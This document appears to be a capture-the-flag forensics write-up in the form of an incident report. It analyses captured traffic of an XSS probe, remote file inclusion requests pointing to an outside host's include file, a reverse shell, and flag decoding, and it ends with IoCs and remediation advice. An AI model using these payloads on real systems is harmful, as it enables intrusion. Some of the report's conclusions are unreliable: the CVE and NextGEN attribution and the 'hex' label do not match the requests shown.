# Incident Investigation Report – Web-Application-Exploitation-&-Remote-File-Inclusion-(RFI)

**Incident Type:** Web Application Exploitation / Cross-Site Scripting (XSS) / Remote File Inclusion (RFI) / Reverse Shell  
**Status:** Completed  
**Date of Analysis:** 26 October 2026  

---

## Executive Summary

An investigation into a captured network traffic file (`dump`) revealed a successful compromise of a web server. The attacker (IP `192.168.1.7`) targeted a victim server (IP `192.168.1.8`) running a vulnerable version of WordPress with the NextGEN Gallery plugin. 

The attacker utilized the Nikto web scanner to identify the vulnerability, exploited it using Cross-Site Scripting (XSS) and Remote File Inclusion (RFI) techniques, and ultimately established a reverse shell on port `6000`. Post-exploitation activities included accessing the server's terminal, retrieving an encrypted string from a flag file (`FL4g.txt`), and using a provided Python cipher script to decode the final flag.

---

## Investigation Workflow

The investigation followed a structured forensic workflow utilizing Wireshark packet captures and terminal outputs:

1. **Network Traffic Analysis (Wireshark)** – Identify attacker/victim IPs and initial reconnaissance.
2. **HTTP Stream Analysis** – Detect XSS payloads and RFI attempts in web requests.
3. **Vulnerability Identification** – Correlate findings with known CVEs.
4. **Post-Exploitation Analysis** – Analyze terminal screenshots for commands executed and file retrievals.
5. **Decryption & Flag Extraction** – Decode the encrypted payload using the provided Python script.
6. **IoC Extraction** – Identify malicious indicators (IPs, URLs, payloads).
7. **MITRE ATT&CK Mapping** – Classify adversary techniques.

---

## 1. Initial Access & Reconnaissance (Event 1)

**Source Log:** Wireshark Capture, HTTP Traffic, dated 2026-10-26.

![Figure 1 – Wireshark HTTP Traffic](screenshots/1.png)

| Field | Value |
|-------|-------|
| **Source IP** | `192.168.1.7` |
| **Destination IP** | `192.168.1.8` |
| **Protocol** | HTTP |
| **Method** | GET / POST |
| **Targeted URIs** | `/cgi-local/`, `/cgi-bin/`, `/servlet/` |

![Figure 2 – Wireshark XSS Attempts](screenshots/2.png)

| Field | Value |
|-------|-------|
| **Source IP** | `192.168.1.7` |
| **Destination IP** | `192.168.1.8` |
| **Protocol** | HTTP |
| **Method** | POST |
| **Payload** | `<script>alert('Vulnerable')</script>` |
| **Targeted URIs** | `/servlet/cookieExample`, `/servlet/custMsg` |

**Interpretation:**  
- The attacker used Cross-Site Scripting (XSS) payloads to test for input validation vulnerabilities.  
- The payload `<script>alert('Vulnerable')</script>` is a classic proof-of-concept to check for reflected or stored XSS.  
- Multiple requests to different servlets indicate automated scanning or manual probing.  
- This marks the initial reconnaissance phase.

---

## 2. Vulnerability Exploitation & Remote File Inclusion (Event 2)

**Source Log:** Wireshark Capture, HTTP Traffic, dated 2026-10-26.

![Figure 3 – RFI Attempt via DFF_config](screenshots/3.png)

| Field | Value |
|-------|-------|
| **Source IP** | `192.168.1.7` |
| **Destination IP** | `192.168.1.8` |
| **Protocol** | HTTP |
| **Method** | GET |
| **URI** | `/DFF_PHP_FrameworkAPI-latest/include/DFF_featured_prdt.func.php` |
| **Parameter** | `DFF_config[dir_include]=http://blog.cirt.net/rfiinc.txt` |

![Figure 4 – RFI Attempt via TemplateDir](screenshots/4.png)

| Field | Value |
|-------|-------|
| **Source IP** | `192.168.1.7` |
| **Destination IP** | `192.168.1.8` |
| **Protocol** | HTTP |
| **Method** | GET |
| **URI** | `/wikihome/action/conflict.php` |
| **Parameter** | `TemplateDir=http://blog.cirt.net/rfiinc.txt` |

![Figure 5 – HTTP Request Stream Details](screenshots/5.png)

| Field | Value |
|-------|-------|
| **Source IP** | `192.168.1.7` |
| **Destination IP** | `192.168.1.8` |
| **Protocol** | HTTP |
| **User-Agent** | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` |
| **Request URI** | `/DFF_PHP_FrameworkAPI-latest/include/DFF_featured_prdt.func.php` |
| **Query Parameter** | `DFF_config[dir_include]=http://blog.cirt.net/rfiinc.txt` |

![Figure 6 – Detailed Packet Analysis of DFF_config RFI](screenshots/6.png)

*Figure 6 – Zoomed-in Wireshark packet details showing the `DFF_config[dir_include]` parameter carrying the external RFI URL.*

![Figure 7 – Detailed Packet Analysis of TemplateDir RFI](screenshots/7.png)

*Figure 7 – Zoomed-in Wireshark packet details showing the `TemplateDir` parameter carrying the external RFI URL.*

**Interpretation:**  
- The attacker attempted Remote File Inclusion (RFI) by injecting an external URL into vulnerable parameters.  
- The target file `http://blog.cirt.net/rfiinc.txt` is a known test file used by the Nikto scanner to detect RFI vulnerabilities.  
- The vulnerable service was identified as **WordPress** (specifically the **NextGEN Gallery** plugin).  
- The CVE associated with this vulnerability is **CVE-2017-1000170**.  
- The attacker successfully exploited this to establish a reverse shell on port **6000**.

---

## 3. Post-Exploitation & Flag Capture (Event 3)

**Source Log:** Terminal History / Wireshark TCP Stream, dated 2026-10-26.

![Figure 8 – Terminal Flag Extraction](screenshots/8.png)

| Field | Value |
|-------|-------|
| **User** | `root@kctf` |
| **Command** | `cat FL4g.txt` |
| **Output (Message)** | `H1! You've come this far analyzing the file. Good Job. :D Here's something for you. Hope you get it.. ;P` |
| **Output (Hex)** | `37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` |

![Figure 9 – Python Decryption Script](screenshots/9.png)

| Field | Value |
|-------|-------|
| **Command** | `python twin_cipher.py -d 37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` |
| **Decoded Flag** | `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}` |

**Interpretation:**  
- After gaining shell access, the attacker navigated the file system and located `FL4g.txt`.  
- The file contained an encrypted hex string and a taunting message.  
- The attacker executed the provided Python script (`twin_cipher.py`) with the `-d` (decode) flag to decrypt the string.  
- The successful decryption yielded the final flag: `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}`.

---

## 4. Correlation & Timeline

| Date/Time (UTC) | Source IP | Destination IP | Action |
|-----------------|-----------|----------------|--------|
| 2026-10-26 (Early) | 192.168.1.7 | 192.168.1.8 | XSS payload testing via HTTP GET/POST |
| 2026-10-26 (Mid) | 192.168.1.7 | 192.168.1.8 | RFI exploitation attempts using `rfiinc.txt` |
| 2026-10-26 (Late) | 192.168.1.7 | 192.168.1.8 | Reverse shell established on port 6000 |
| 2026-10-26 (Late) | 192.168.1.7 | 192.168.1.8 | Flag retrieval and Python decryption |

**Hypothesis:** The attacker used automated tools (Nikto) to scan for web vulnerabilities, manually exploited the NextGEN Gallery RFI to gain a shell, and then performed post-exploitation to capture the flag.

---

## 5. Indicators of Compromise (IoC)

| Type | Value | Notes |
|------|-------|-------|
| **Attacker IP** | `192.168.1.7` | Source of malicious traffic |
| **Victim IP** | `192.168.1.8` | Target web server |
| **Vulnerable Service** | WordPress / NextGEN Gallery | CVE-2017-1000170 |
| **Malicious URL** | `http://blog.cirt.net/rfiinc.txt` | RFI payload source |
| **XSS Payload** | `<script>alert('Vulnerable')</script>` | Reconnaissance payload |
| **Reverse Shell Port** | `6000` | C2 communication port |
| **Encrypted Flag** | `37n3vq6rp6k05ov3305fy5b33sj3rq2sy4p56735853h9` | Retrieved from `FL4g.txt` |
| **Decoded Flag** | `KCTF{Expl0ItiNg_S3RvEr_Is_fUN}` | Final objective achieved |

---

## 6. MITRE ATT&CK Mapping

| Technique | Tactic | ID | Evidence |
|-----------|--------|----|----------|
| Active Scanning | Reconnaissance | T1595 | Use of Nikto to scan for web vulnerabilities (RFI test files). |
| Exploit Public-Facing Application | Initial Access | T1190 | Exploitation of CVE-2017-1000170 in WordPress NextGEN Gallery. |
| Command and Scripting Interpreter | Execution | T1059 | Use of Python and Bash terminal commands for post-exploitation. |
| Exfiltration Over C2 Channel | Exfiltration | T1041 | Retrieval of the flag file and subsequent decryption. |

---

## 7. Conclusion & Recommendations

**Conclusion:**  
The investigation confirmed that the victim's web server (`192.168.1.8`) was fully compromised through a combination of unpatched software (WordPress NextGEN Gallery) and weak input validation. The attacker successfully leveraged RFI to execute arbitrary code and establish a reverse shell on port `6000`, leading to the exfiltration of sensitive data and the capture of the final flag. The attacker demonstrated a clear understanding of web exploitation techniques and post-exploitation methodology.

### Immediate Actions (L1)
1. **Isolate** the victim server `192.168.1.8` from the network.  
2. **Block** the attacker IP `192.168.1.7` at the perimeter firewall.  
3. **Blacklist** outbound connections to `blog.cirt.net`.  
4. **Patch** the WordPress installation and specifically the NextGEN Gallery plugin to remediate CVE-2017-1000170.  
5. **Scan** the server for any other unauthorized files or web shells.  

### Long-term Recommendations
1. **Implement a Web Application Firewall (WAF)** to detect and block common web exploitation patterns like `<script>` tags and external file inclusion attempts.  
2. **Disable `allow_url_include`** in PHP configurations to prevent RFI attacks.  
3. **Conduct regular vulnerability scanning** and patch management cycles for all public-facing applications.  
4. **Restrict outbound network traffic** from web servers to prevent reverse shell callbacks on unexpected ports (e.g., port 6000).  

### Lessons Learned
1. **Unpatched plugins are a primary attack vector** – the NextGEN Gallery vulnerability was the root cause of this compromise.  
2. **RFI can lead to full system compromise** – attackers can easily pivot from file inclusion to remote code execution.  
3. **Automated tools like Nikto leave clear signatures** – monitoring for requests to `rfiinc.txt` can help detect early reconnaissance.  
4. **Post-exploitation analysis is crucial** – understanding the attacker's actions after gaining access helps in assessing the full scope of the breach.

---